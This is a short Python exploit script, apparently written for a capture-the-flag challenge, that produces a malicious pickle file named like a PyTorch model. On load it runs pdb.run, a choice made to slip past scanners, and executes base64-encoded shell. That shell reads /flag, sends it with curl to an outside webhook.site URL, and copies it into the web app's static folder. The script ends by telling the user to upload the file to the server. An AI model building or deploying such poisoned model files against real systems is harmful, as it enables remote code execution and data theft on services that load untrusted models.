import pickle
import sys
import pdb
import base64

# CONFIGURATION
# =============
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 

# COMMAND
# =======
# We will execute this inside the python environment on the server.
raw_cmd = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"
b64_cmd = base64.b64encode(raw_cmd.encode()).decode()

# The python code to run via pdb
# We import os inside the execution string to delay the import until runtime
python_payload = f"import os; os.system('echo {b64_cmd} | base64 -d | sh')"

print(f"[*] Payload Logic: pdb.run(\"{python_payload}\")")

class MaliciousModel(object):
    def __reduce__(self):
        # pdb.run() executes a string of code.
        # It's part of the standard library but often missed by scanners.
        return (pdb.run, (python_payload,))

if __name__ == "__main__":
    output_file = "nailong_payload_v3.pth"
    with open(output_file, 'wb') as f:
        pickle.dump(MaliciousModel(), f)
    print(f"[+] Generated {output_file}")
    print("[!] Upload this file to the server.")
